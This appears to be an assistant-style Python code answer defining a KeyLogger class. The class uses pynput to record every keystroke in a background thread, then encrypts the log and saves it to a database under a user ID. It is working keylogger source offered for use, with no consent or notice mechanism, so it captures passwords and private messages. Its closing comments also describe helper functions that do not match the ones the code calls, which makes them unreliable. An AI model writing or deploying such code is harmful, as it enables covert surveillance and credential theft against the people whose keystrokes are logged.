import datetime
from pynput.keyboard import Key, Listener
import threading
from myapp.db.db import Database
from myapp.encryption.encryption import encrypt_data


class KeyLogger:
    def __init__(self, user_id):
        self.log = ""
        self.user_id = user_id
        self._stop_event = threading.Event()

    def on_press(self, key):
        if self._stop_event.is_set():
            return False
        # Update the log in memory
        self.log += f'{key}'

    def start(self):
        self.thread = threading.Thread(target=self._run)
        self.thread.start()

    def _run(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop(self):
        db = Database()
        self._stop_event.set()
        self.thread.join()
        # Encrypt the log
        encrypted_log = encrypt_data(self.log.encode())
        # Save the log to the database
        db.insert_key_log(self.user_id, encrypted_log, datetime.datetime.now())
        # Clear the log in memory
        self.log = ""



# In this version of KeyLogger, the log is stored in memory and then saved to the database when the key listener is stopped. This is done to reduce the number of database interactions.

# Note: This example assumes that you have implemented a Database class in myapp.db.db with a method execute(sql, params) that executes the given SQL statement with the provided parameters, and an encrypt(message) function in myapp.encryption.encryption that encrypts the provided message.

# Also, you have to pass user_id to KeyLogger when you create an instance of it. The user_id should be the ID of the user whose key strokes are being logged.